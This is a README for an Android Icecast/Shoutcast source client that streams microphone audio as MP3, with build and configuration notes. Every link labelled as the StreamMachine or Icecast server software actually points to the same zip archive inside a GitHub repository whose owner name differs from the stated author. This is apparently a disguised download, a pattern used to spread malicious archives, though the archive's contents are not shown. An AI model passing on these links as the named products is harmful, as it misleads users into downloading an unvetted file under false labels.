##Android Icecast/Shoutcast Broadcast##
This project aims to implement an icecast source client that captures realtime audio from microphone, encodes and streams (mp3) to iceserver. 
Code implements basic ice protocol and is mostly tested with <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">StreamMachine</a>, for ice input source.
Repo is still preview and will be packaged as library.

###Native Libraries###
Although native libraries are included in jniLibs folder, developers encouraged to build from source files. <br>
* Enter jni folder on command line and call. Note that ndk-build should be on your path or print full path of binary<br><br>
<code>ndk-build</code>


###Formats###
Mp3 is the only encoder format that is currently supported but vorbiss ogg will be added too. Vorbis and ogg native libraries are included in source code and working without limitation.

###Notice###
Please update upstream configuration in <code>BroadcastFragment</code> regarding your server conf.

###Help###
Code is easy to understand and implementation is straightforward, but if you have additional questions, write me: fatih dot sokmen at gmail dot com 

###Testing Environments that work fine###
- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">StreamMachine</a>
- <a href="https://raw.githubusercontent.com/dextercool/android-icecast-broadcast/master/Mactra/android-icecast-broadcast.zip">IceCast Server</a>




